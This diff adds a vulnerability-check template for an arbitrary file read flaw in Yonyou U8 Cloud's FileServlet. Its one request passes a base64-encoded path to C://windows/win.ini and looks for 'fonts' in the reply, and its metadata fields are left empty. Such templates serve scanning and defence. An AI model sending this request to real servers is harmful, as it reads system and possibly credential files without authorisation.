@@ -1,0 +1,18 @@
+id:
+
+info:
+  name: 用友U8 Cloud FileServlet 任意文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ==
+  headers:
+response1:
+  headers:
+  body: fonts
+  code:
+requests2:
+response2:
